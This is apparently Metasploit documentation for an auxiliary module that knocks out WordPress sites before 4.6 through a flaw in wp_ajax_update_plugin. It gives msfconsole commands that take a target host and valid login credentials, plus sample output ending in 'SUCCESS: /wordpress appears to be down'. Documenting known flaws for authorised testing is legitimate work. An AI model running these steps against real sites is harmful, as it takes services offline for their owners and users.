## Vulnerable Application

This module exploits a Cross-site request forgery (CSRF) vulnerability in the [wp_ajax_update_plugin](https://core.trac.wordpress.org/changeset/38168) 
function in wp-admin/includes/ajax-actions.php in Wordpress before 4.6. This allows remote authenticated users to cause a denial of 
service (with /dev/random read operations).

You can find the vulnerable application like [4.5.3](https://wordpress.org/wordpress-4.5.3.tar.gz) from the 
[official website](https://wordpress.org/download/release-archive/)

## Verification Steps

1. Start msfconsole
2. Do: ```use auxiliary/dos/http/wordpress_directory_traversal_dos.rb```
3. Do: ```set RHOST [IP]```
4. Do: ```set TARGETURI [WordPress path]```
5. Do: ```set USERNAME [Valid Username]```
6. Do: ```set PASSWORD [Valid Password]```
7. Do: ```exploit```
8. WordPress website should be down

## Scenarios

### Wordpress 4.5.3 on Linux Mint 17.3

```
msf auxiliary(wordpress_directory_traversal_dos) > exploit

[*] Checking if user "test" exists...
[+] Username "test" is valid
[*] Executing requests 1 - 5...
[+] Finished executing requests 1 - 5
[*] Executing requests 6 - 10...
[+] Finished executing requests 6 - 10
...
[*] Executing requests 191 - 195...
[+] Finished executing requests 191 - 195
[*] Executing requests 196 - 200...
[+] Finished executing requests 196 - 200
[+] SUCCESS: /wordpress appears to be down
[*] Auxiliary module execution completed
```
